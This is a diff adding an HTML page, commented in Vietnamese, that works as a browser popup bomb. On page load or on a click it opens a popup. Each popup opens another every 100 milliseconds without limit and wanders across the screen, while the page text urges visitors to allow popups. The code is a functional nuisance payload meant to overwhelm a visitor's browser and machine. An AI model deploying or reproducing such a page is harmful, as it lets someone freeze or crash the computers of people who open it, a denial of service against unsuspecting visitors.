@@ -1,0 +1,159 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ツ</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .main-tsu {
+            font-size: 100px;
+            animation: pulse 0.5s infinite alternate;
+        }
+        .status {
+            margin-top: 20px;
+            color: #ff3333;
+            font-size: 18px;
+            text-align: center;
+            pointer-events: none;
+            font-weight: bold;
+        }
+        @keyframes pulse {
+            from { transform: scale(1); opacity: 0.8; }
+            to { transform: scale(1.2); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-tsu">ツ</div>
+    <div class="status" id="status-text">load...<br>(Nếu bị chặn, hãy CLICK vào màn hình và chọn Cho phép Popup để ko bị popup ツ</div>
+
+    <script>
+        // Kiểm tra xem đây có phải là cửa sổ con (popup) không
+        const isPopup = window.location.search.includes('win=true');
+
+        if (isPopup) {
+            // ==========================================
+            // CỬA SỔ CON: TỰ ĐỘNG ĐẺ THÊM MỖI GIÂY
+            // ==========================================
+            
+            // Thiết lập giao diện
+            document.body.style.backgroundColor = '#000';
+            document.body.style.cursor = 'default';
+            document.body.innerHTML = '<div style="font-size: 80px; font-family: Arial, sans-serif; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh;">ツ</div>';
+            document.title = 'about:blankツ';
+
+            // Vòng lặp vô tận: Cứ 1 giây, mỗi cửa sổ lại đẻ ra 1 cửa sổ mới
+            setInterval(() => {
+                // Tính toán vị trí ngẫu nhiên
+                const width = 250;
+                const height = 150;
+                const x = Math.floor(Math.random() * (window.screen.availWidth - width));
+                const y = Math.floor(Math.random() * (window.screen.availHeight - height));
+
+                // Mở cửa sổ thật (Không có giới hạn)
+                window.open(
+                    window.location.pathname + '?win=true', 
+                    '_blank', 
+                    `width=${width},height=${height},left=${x},top=${y},menubar=no,toolbar=no,location=no,status=no,resizable=no`
+                );
+            }, 100); // 100ms = 0.1 giây
+
+            // ==========================================
+            // ★ THÊM MỚI: DI CHUYỂN CỬA SỔ CON ★
+            // (KHÔNG sửa gì ở trên, chỉ thêm block này)
+            // ==========================================
+            (function flyAround() {
+                let mx = window.screenX || window.screenLeft || 100;
+                let my = window.screenY || window.screenTop  || 100;
+
+                // Vận tốc ban đầu ngẫu nhiên (âm hoặc dương)
+                let mvx = (Math.random() - 0.5) * 24 || 8;
+                let mvy = (Math.random() - 0.5) * 24 || 8;
+
+                function step() {
+                    // Gia tốc ngẫu nhiên nhẹ → bay "loạn" thật sự
+                    mvx += (Math.random() - 0.5) * 4;
+                    mvy += (Math.random() - 0.5) * 4;
+
+                    // Giới hạn tốc độ (tránh văng quá nhanh)
+                    const VMAX = 40;
+                    mvx = Math.max(-VMAX, Math.min(VMAX, mvx));
+                    mvy = Math.max(-VMAX, Math.min(VMAX, mvy));
+
+                    mx += mvx;
+                    my += mvy;
+
+                    // Kích thước cửa sổ hiện tại (fallback 250x150)
+                    const ww = window.outerWidth  || 250;
+                    const wh = window.outerHeight || 150;
+
+                    const maxX = Math.max(0, window.screen.availWidth  - ww);
+                    const maxY = Math.max(0, window.screen.availHeight - wh);
+
+                    // Nảy tường
+                    if (mx <= 0)    { mx = 0;    mvx =  Math.abs(mvx); }
+                    if (mx >= maxX) { mx = maxX; mvx = -Math.abs(mvx); }
+                    if (my <= 0)    { my = 0;    mvy =  Math.abs(mvy); }
+                    if (my >= maxY) { my = maxY; mvy = -Math.abs(mvy); }
+
+                    try { window.moveTo(Math.round(mx), Math.round(my)); } catch (e) {}
+
+                    requestAnimationFrame(step);
+                }
+
+                requestAnimationFrame(step);
+            })();
+            // ==========================================
+            // ★ HẾT PHẦN THÊM MỚI ★
+            // ==========================================
+
+        } else {
+            // ==========================================
+            // TRANG CHÍNH: TỰ ĐỘNG KÍCH HOẠT
+            // ==========================================
+            
+            let hasStarted = false;
+
+            function startChaos() {
+                if (hasStarted) return;
+                hasStarted = true;
+                
+                // Mở cửa sổ thật đầu tiên ở giữa màn hình
+                const width = 250;
+                const height = 150;
+                const x = Math.floor((window.screen.availWidth - width) / 2);
+                const y = Math.floor((window.screen.availHeight - height) / 2);
+                
+                window.open(
+                    window.location.pathname + '?win=true', 
+                    '_blank', 
+                    `width=${width},height=${height},left=${x},top=${y},menubar=no,toolbar=no,location=no,status=no,resizable=no`
+                );
+                
+                document.getElementById('status-text').innerHTML = "ツ hehe";
+                document.body.style.cursor = 'default';
+            }
+
+            // Cố gắng tự động mở ngay khi tải trang (sau 100ms)
+            setTimeout(startChaos, 100);
+
+            // Nếu trình duyệt chặn, click vào màn hình để kích hoạt
+            document.body.addEventListener('click', startChaos);
+        }
+    </script>
+</body>
+</html>
